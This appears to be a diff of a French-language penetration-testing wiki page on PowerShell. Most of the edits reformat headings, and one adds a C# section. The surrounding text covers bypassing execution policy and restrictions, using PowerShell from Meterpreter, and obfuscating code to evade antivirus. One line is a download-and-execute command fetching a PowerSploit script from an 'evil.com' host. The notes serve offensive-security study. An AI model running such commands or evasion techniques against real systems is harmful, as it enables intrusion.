@@ -5,8 +5,7 @@ permalink: /Powershell/
 
 # Powershell
 
-Généralités
------------
+## Généralités
 
 - powershell.exe n'est pas "Powershell" mais juste une interface pour intéragir avec. Il est possible d'utiliser d'autres interfaces comme **Not Powershell** (https://github.com/Ben0xA/nps) ou **PSAttack** (https://github.com/jaredhaight/PSAttack) Il est ainsi possible de contourner certaines restrictions avec ceci (e.g. blocage de powershell.exe ou Constrained Powershell Enforced)
 - Il est possible d'activer le logging pour Powershell. 
@@ -17,8 +16,7 @@ Généralités
 - (Windows 10): [Just Enough Administration](/Just_Enough_Administration/)
 
 
-Commandes
----------
+## Commandes
 
 Obtenir de l'aide en powershell:
 
@@ -42,8 +40,7 @@ Pour faire du formatting / output:
 Get-Process | Format-List -Property Threads, SessionId # Affiche le résultat sous forme de liste en se limitant à certaines informations
 ```
 
-Meterpreter
--------------------
+## Meterpreter
 
 Il est possible d'utiliser powershell à partir d'un meterpreter:
 ```
@@ -52,8 +49,7 @@ load powershell
 
 Voir [Meterpreter New Windows PowerShell Extension](http://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension)
 
-Execution Policy
-----------------
+## Execution Policy
 
 Il est possible de contourner l'execution policy ("\[...\] running scripts is disabled on this system."):
 
@@ -66,9 +62,11 @@ iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1
 
 Il est très important de comprendre que l'execution policy n'est pas un mécanisme de sécurité ! (Microsoft le dit lui-même)
 
-Obfuscation
------------
+## Obfuscation
 Il est possible d'obfusquer du code powershell pour contourner certains antivirus qui bloquent powersploit & cie. L'outil [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) permet de faire ceci facilement. Il est cependant possible de bloquer les codes obfusqués (une analyse statistique permet de détecter les codes non légitimes).
+
+## C#
+Il est possible d'utiliser du C# via Powershell. Voir [Using C# in Powershell scripts](https://blogs.technet.microsoft.com/stefan_gossner/2010/05/07/using-csharp-c-code-in-powershell-scripts/)
 
 
 Resources
